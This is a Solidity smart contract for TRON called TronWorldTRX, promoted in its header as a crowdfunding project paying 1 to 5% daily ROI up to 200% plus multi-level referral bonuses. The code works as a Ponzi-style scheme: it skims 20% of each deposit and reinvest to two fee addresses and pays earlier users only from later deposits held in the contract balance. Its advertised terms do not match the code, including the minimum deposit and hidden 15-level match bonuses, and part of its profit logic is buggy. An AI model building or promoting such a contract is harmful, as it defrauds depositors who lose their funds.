//SourceUnit: TronWorld_new2801_0544.sol


pragma solidity ^0.4.25;

/*

------------------------------------
Crowdfunding & Crowdsharing project
------------------------------------ 
 CONTRACT MANAGEMENT:
------------------------------------
1 to 5% daily ROI until 200% of your active deposit
5% direct referral 👨  
2% referred level 2 👨🏽‍👨🏽‍  
1% referred level 3 👨🏽‍👨🏽‍👨🏽‍  

------------------------------------
Reinvest to generate compound interest
------------------------------------
*/


contract TronWorldTRX {

    using SafeMath for uint256;

    uint public totalPlayers;
    uint public totalPayout;
    uint public totalInvested;
    uint public totalReinvest;
    uint public activedeposits;
    uint private minDepositSize = 100000000; //50trx
    uint private interestRateDivisor = 1000000000000;
    uint public devCommission = 1;
    uint public commissionDivisor = 100;
     
    uint private releaseTime = 1602446400;  //11 october, 20pm UTC
   
    
    address private feed1;
    address private feed2;

	
	
    address owner;
    struct Player {
        uint trxDeposit;
       
        uint time;
        uint interestProfit;
        uint affRewards;
        uint payoutSum;
        address affFrom;
        uint256 referrals;
        uint256 match_bonus;
        uint256[8] affsum;     
    }

    uint8[] public ref_bonuses;                     // 1 => 0.1%

    mapping(address => Player) public players;
    
    event Newbie(address indexed user, address indexed _referrer, uint _time);  
	event NewDeposit(address indexed user, uint256 amount, uint _time);  
	event Withdrawn(address indexed user, uint256 amount, uint _time);  
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount, uint _time);
	event Reinvest(address indexed user, uint256 amount, uint _time); 


    constructor(address _marketingAddr, address _projectAddr) public {

		feed1 = _projectAddr;
		feed2 = _marketingAddr;
		owner = msg.sender;

        ref_bonuses.push(200);
        ref_bonuses.push(100);
        ref_bonuses.push(50);
        ref_bonuses.push(30);
        ref_bonuses.push(30);
        ref_bonuses.push(30);
        ref_bonuses.push(30);
        ref_bonuses.push(20);
        ref_bonuses.push(20);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(5);
        ref_bonuses.push(5);        
	}


    function refincome (address _addr) public view returns(uint[8] memory _data)
    {
        for(uint i=0; i<8; i++ )
        {
            _data[i]=players[_addr].affsum[i];
        }
        return _data;
    }


    function register(address _addr, address _affAddr) private{

      Player storage player = players[_addr];

      player.affFrom = _affAddr;
      players[_affAddr].referrals++;

      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;
      address _affAddr4 = players[_affAddr3].affFrom;
      address _affAddr5 = players[_affAddr4].affFrom;
      address _affAddr6 = players[_affAddr5].affFrom;
      address _affAddr7 = players[_affAddr6].affFrom;
      address _affAddr8 = players[_affAddr7].affFrom;

      players[_affAddr1].affsum[0] = players[_affAddr1].affsum[0].add(1);
      players[_affAddr2].affsum[1] = players[_affAddr2].affsum[1].add(1);
      players[_affAddr3].affsum[2] = players[_affAddr3].affsum[2].add(1);
      players[_affAddr4].affsum[3] = players[_affAddr4].affsum[3].add(1);
      players[_affAddr5].affsum[4] = players[_affAddr5].affsum[4].add(1);
      players[_affAddr6].affsum[5] = players[_affAddr6].affsum[5].add(1);
      players[_affAddr7].affsum[6] = players[_affAddr7].affsum[6].add(1);
      players[_affAddr8].affsum[7] = players[_affAddr8].affsum[7].add(1);
      
     
    }

    function () external payable {

    }

    function deposit(address _affAddr) public payable {
    
        
        if (now >= releaseTime){
        collect(msg.sender);
        
        }
        require(msg.value >= minDepositSize, "not minimum amount!");


        uint depositAmount = msg.value;

        Player storage player = players[msg.sender];

        if (player.time == 0) {
            
            if (now < releaseTime) {
               player.time = releaseTime; 
                
            }
            else{
               
               player.time = now; 
            }    
                
            
            
            
            totalPlayers++;
         
            if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){
                 emit Newbie(msg.sender, _affAddr, now);
              register(msg.sender, _affAddr);
            }
            else{
                emit Newbie(msg.sender, owner, now);
              register(msg.sender, owner);
            }
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);

        distributeRef(msg.value, player.affFrom);  

        totalInvested = totalInvested.add(depositAmount);
        activedeposits = activedeposits.add(depositAmount);
        emit NewDeposit(msg.sender, depositAmount, now); 
        //uint feedEarn = depositAmount.mul(devCommission).mul(8).div(commissionDivisor);
        // uint feedtrx1 = feedEarn.div(4);
        // uint feedtrx2 = feedtrx1 +feedEarn.div(2);
        uint feedtrx1 = depositAmount.mul(10).div(100);
        uint feedtrx2 = depositAmount.mul(10).div(100);
        feed1.transfer(feedtrx1);
        feed2.transfer(feedtrx2);
    }

    function withdraw() public {
        collect(msg.sender);
        
        require(players[msg.sender].interestProfit > 0);

        
        transferPayout(msg.sender, players[msg.sender].interestProfit);
        
        
    }

    function reinvest() public {
      collect(msg.sender);
      Player storage player = players[msg.sender];
      uint256 depositAmount = player.interestProfit;
      require(address(this).balance >= depositAmount);
      player.interestProfit = 0;
      player.trxDeposit = player.trxDeposit.add(depositAmount.mul(80).div(100));

      totalReinvest = totalReinvest.add(depositAmount);
      activedeposits = activedeposits.add(depositAmount.mul(80).div(100));
      emit Reinvest(msg.sender, depositAmount, now);
      distributeRef(depositAmount, player.affFrom);

      //uint feedEarn = depositAmount.mul(devCommission).mul(8).div(commissionDivisor);
     // uint feedtrx1 = feedEarn.div(4);
     // uint feedtrx2 = feedtrx1 + feedEarn.div(2);
       uint feedtrx1 = depositAmount.mul(10).div(100);
       uint feedtrx2 = depositAmount.mul(10).div(100);
      feed1.transfer(feedtrx1);
      feed2.transfer(feedtrx2);
        
        
    }


    function collect(address _addr) internal {
        Player storage player = players[_addr];
        
    	uint256 vel = getvel();
	
        uint secPassed = now.sub(player.time);
        if (secPassed > 0 && player.time > 0) {
            uint collectProfit = (player.trxDeposit.mul(secPassed.mul(vel))).div(interestRateDivisor);
            player.interestProfit = player.interestProfit.add(collectProfit);
            if (player.interestProfit >= player.trxDeposit.mul(2)){
                player.interestProfit = player.trxDeposit.mul(2);
            }
            
            player.time = player.time.add(secPassed);
        }
    }

    function transferPayout(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);
                activedeposits = activedeposits.sub(payout/2);
                activedeposits = activedeposits.add(payout.mul(1).div(4));

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);
                player.trxDeposit = player.trxDeposit.sub(payout/2);
                player.trxDeposit = player.trxDeposit.add(payout.mul(1).div(4));
 
                msg.sender.transfer(payout.mul(3).div(4));
                _refPayout(msg.sender, payout);
                emit Withdrawn(msg.sender, payout, now);
            }
        }
    }

     

    function distributeRef(uint256 _trx, address _affFrom) private{

        uint256 _allaff = (_trx.mul(10)).div(100);

        address _affAddr1 = _affFrom;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        address _affAddr4 = players[_affAddr3].affFrom;
        address _affAddr5 = players[_affAddr4].affFrom;
        address _affAddr6 = players[_affAddr5].affFrom;
        address _affAddr7 = players[_affAddr6].affFrom;
       address _affAddr8 = players[_affAddr7].affFrom;

        uint256 _affRewards = 0;

        if (_affAddr1 != address(0)) {
            _affRewards = (_trx.mul(5)).div(100);
            _allaff = _allaff.sub(_affRewards);
           
           if (now > releaseTime) {
               collect(_affAddr1);
                
            }

            players[_affAddr1].affRewards = _affRewards.add(players[_affAddr1].affRewards);
            players[_affAddr1].trxDeposit = _affRewards.add(players[_affAddr1].trxDeposit);
            activedeposits = activedeposits.add(_affRewards);
            emit RefBonus(_affAddr1, msg.sender, 1, _affRewards, now);
    
          
        }

        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
            _allaff = _allaff.sub(_affRewards);
            if (now > releaseTime) {
               collect(_affAddr2);
                
            }
            players[_affAddr2].affRewards = _affRewards.add(players[_affAddr2].affRewards);
            players[_affAddr2].trxDeposit = _affRewards.add(players[_affAddr2].trxDeposit);
            activedeposits = activedeposits.add(_affRewards);
            emit RefBonus(_affAddr2, msg.sender, 2, _affRewards, now);
        }

        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(1)).div(100);
            _allaff = _allaff.sub(_affRewards);
            if (now > releaseTime) {
               collect(_affAddr3);
                
            }
            players[_affAddr3].affRewards = _affRewards.add(players[_affAddr3].affRewards);
            players[_affAddr3].trxDeposit = _affRewards.add(players[_affAddr3].trxDeposit);
            activedeposits = activedeposits.add(_affRewards);
            emit RefBonus(_affAddr3, msg.sender, 3, _affRewards, now);
        }

        // if (_affAddr4 != address(0)) {
        //     _affRewards = (_trx.mul(1)).div(100);
        //     _allaff = _allaff.sub(_affRewards);
        //     if (now > releaseTime) {
        //        collect(_affAddr4);
                
        //     }
        //     players[_affAddr4].affRewards = _affRewards.add(players[_affAddr4].affRewards);
        //     players[_affAddr4].trxDeposit = _affRewards.add(players[_affAddr4].trxDeposit);
        //     activedeposits = activedeposits.add(_affRewards);
        //     emit RefBonus(_affAddr4, msg.sender, 4, _affRewards, now);
        // }
        if (_affAddr4 != address(0)) {
            _affRewards = 0;
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr4].affRewards = _affRewards.add(players[_affAddr4].affRewards);
            players[_affAddr4].trxDeposit = _affRewards.add(players[_affAddr4].trxDeposit);
        }
        
        if (_affAddr5 != address(0)) {
            _affRewards = 0;
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr5].affRewards = _affRewards.add(players[_affAddr5].affRewards);
            players[_affAddr5].trxDeposit = _affRewards.add(players[_affAddr5].trxDeposit);
        }

        if (_affAddr6 != address(0)) {
            _affRewards = 0;
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr6].affRewards = _affRewards.add(players[_affAddr6].affRewards);
            players[_affAddr6].trxDeposit = _affRewards.add(players[_affAddr6].trxDeposit);

        }

        if (_affAddr7 != address(0)) {
            _affRewards = 0;
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr7].affRewards = _affRewards.add(players[_affAddr7].affRewards);
            players[_affAddr7].trxDeposit = _affRewards.add(players[_affAddr7].trxDeposit);
        }

        if (_affAddr8 != address(0)) {
            _affRewards = 0;
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr8].affRewards = _affRewards.add(players[_affAddr8].affRewards);
            players[_affAddr8].trxDeposit = _affRewards.add(players[_affAddr8].trxDeposit);
        }

        

        if(_allaff > 0 ){
       
            _affRewards = _allaff;
            if (now > releaseTime) {
               collect(owner);
                
            }
            players[owner].affRewards = _affRewards.add(players[owner].affRewards);
            players[owner].trxDeposit = _affRewards.add(players[owner].trxDeposit);
            activedeposits = activedeposits.add(_affRewards);
            
        }
    }

    function getProfit(address _addr) public view returns (uint) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0);

        if ( now < releaseTime){
        return 0;
            
            
        }
        else{


      uint secPassed = now.sub(player.time);
      
	  uint256 vel = getvel();
	  
      if (secPassed > 0) {
          uint collectProfit = (player.trxDeposit.mul(secPassed.mul(vel))).div(interestRateDivisor);
      }
      
      if (collectProfit.add(player.interestProfit) >= player.trxDeposit.mul(2)){
               return player.trxDeposit.mul(2);
            }
        else{
      return collectProfit.add(player.interestProfit);
        }
        }
    }

    event MatchPayout(address indexed addr, address indexed from, uint256 amount);    
    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].affFrom;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            if(players[up].referrals >= i + 1) {
                uint256 bonus = ((_amount * 100000000000 )  * ref_bonuses[i] / 1000) / 100000000000;
                
                players[up].match_bonus += bonus;
                players[up].trxDeposit = bonus.add(players[up].trxDeposit);
                emit MatchPayout(up, _addr, bonus);
            }

            up = players[up].affFrom;
        }
    }    
    
    
     function getContractBalanceRate() public view returns (uint256) {
		uint256 contractBalance = address(this).balance;
	
		uint256 contractBalancePercent = contractBalance.div(100000000000); 
		
		if (contractBalancePercent >=0 && contractBalancePercent <=50){
		    contractBalancePercent = 10;
		}
        else if (contractBalancePercent >=51 && contractBalancePercent <=250){
		    contractBalancePercent = 20;
		}
        else if (contractBalancePercent >=251){
		    contractBalancePercent = 40;
		}
		
		return contractBalancePercent;
	}
    
       function getvel() public view returns (uint256) { 
	
		uint256 PercentRate = getContractBalanceRate();
	
		uint256 vel = 116000 + PercentRate.mul(11600) ; //vel from 1%
		

		return vel;
	}

    
    
     
    
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}